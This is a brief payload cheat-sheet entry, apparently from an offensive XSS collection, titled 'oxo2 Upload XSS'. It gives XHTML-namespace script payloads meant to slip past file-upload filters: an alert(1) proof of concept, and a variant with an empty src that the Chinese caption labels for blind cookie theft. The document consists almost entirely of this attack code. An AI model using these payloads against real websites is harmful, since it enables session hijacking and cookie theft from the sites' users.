#### oxo2 Upload XSS

```
<html\>
<head\></head\>
<body\>
<something:script xmlns:something\="http://www.w3.org/1999/xhtml"\>alert(1)</something:script\>
</body\>
</html\>

盲打Cookie、src=""：
<something:script src\="" xmlns:something\="http://www.w3.org/1999/xhtml"\></something:script\>
```
